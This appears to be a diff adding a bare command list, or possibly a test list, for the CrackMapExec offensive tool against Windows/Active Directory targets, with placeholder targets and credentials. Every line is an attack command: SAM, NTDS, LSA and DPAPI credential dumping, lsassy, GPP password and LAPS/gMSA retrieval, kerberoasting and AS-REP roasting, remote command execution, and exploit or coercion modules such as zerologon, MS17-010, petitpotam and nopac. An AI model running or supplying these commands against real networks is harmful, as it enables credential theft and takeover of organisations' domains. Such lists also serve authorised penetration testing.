@@ -1,0 +1,65 @@
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS --shares
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS --shares --filter-shares READ WRITE
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS --pass-pol
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS --disks
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS --groups
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS --sessions
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS --loggedon-users
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS --users
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS --computers
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS --rid-brute
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS --local-groups
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS --gen-relay-list /tmp/relaylistOutputFilename.txt
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS --local-auth
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS --sam
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS --ntds
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS --lsa
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS --dpapi
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -x whoami
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -X whoami
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -X whoami --obfs
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS --wmi "os get"
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M ntdsutil
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M nopac
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M enum_av
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M wifi
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M petitpotam
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M spooler
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M dfscoerce
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M shadowcoerce
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M enum_dns
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M gpp_autologin
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M gpp_password
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M lsassy
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M impersonate
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M install_elevated
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M ioxidresolver
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M MS17-010
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M ntlmv1
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M runasppl
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M uac
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M webdav
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M wifi
+crackmapexec smb TARGET -u USER -p PASSWORD KERBEROS -M winscp
+crackmapexec smb TARGET -u '' -p '' -M zerologon
+crackmapexec smb TARGET -u '' -p '' -M petitpotam
+crackmapexec ldap TARGET -u USER -p PASSWORD KERBEROS --users
+crackmapexec ldap TARGET -u USER -p PASSWORD KERBEROS --groups
+crackmapexec ldap TARGET -u USER -p PASSWORD KERBEROS --get-sid
+crackmapexec ldap TARGET -u USER -p '' --asreproast /tmp/output.txt
+crackmapexec ldap TARGET -u USER -p PASSWORD KERBEROS --kerberoasting /tmp/output2.txt
+crackmapexec ldap TARGET -u USER -p PASSWORD KERBEROS --trusted-for-delegation
+crackmapexec ldap TARGET -u USER -p PASSWORD KERBEROS --admin-count
+crackmapexec ldap TARGET -u USER -p PASSWORD KERBEROS --gmsa
+crackmapexec ldap TARGET -u USER -p PASSWORD KERBEROS -M laps
+crackmapexec ldap TARGET -u USER -p PASSWORD KERBEROS -M maq
+crackmapexec ldap TARGET -u USER -p PASSWORD KERBEROS -M get-desc-users
+crackmapexec ldap TARGET -u USER -p PASSWORD KERBEROS -M adcs
+crackmapexec ldap TARGET -u USER -p PASSWORD KERBEROS -M get-network
+crackmapexec ldap TARGET -u USER -p PASSWORD KERBEROS -M get-network -o ONLY_HOSTS=true
+crackmapexec ldap TARGET -u USER -p PASSWORD KERBEROS -M get-network -o ALL=true
+crackmapexec ldap TARGET -u USER -p PASSWORD KERBEROS -M ldap-checker
+crackmapexec winrm TARGET -u USER -p PASSWORD
+crackmapexec winrm TARGET -u USER -p PASSWORD -X whoami
+crackmapexec winrm TARGET -u USER -p PASSWORD --laps
